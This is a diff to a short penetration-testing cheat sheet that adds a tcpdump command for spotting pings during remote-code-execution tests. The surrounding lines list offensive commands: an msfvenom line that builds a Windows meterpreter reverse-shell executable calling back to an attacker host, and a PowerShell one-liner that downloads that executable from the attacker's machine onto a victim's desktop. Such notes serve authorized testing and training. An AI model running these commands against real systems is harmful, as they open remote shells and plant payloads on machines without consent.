@@ -7,6 +7,7 @@
 ## Exploit
 * `python -m SimpleHTTPServer 80` _Start web server on kali in current dir_
 * `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe >m.exe` _Make a standard meterpreter exe_
+* `tcpdump -i {tun0} icmp` _Listen for ping requests.  Useful when testing RCE_
 
 ## Priv Esc Windows
 * `powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://{kali_ip}:8080/m.exe', 'c:\users\victim\desktop\m.exe') }"` _Powershell download a file_
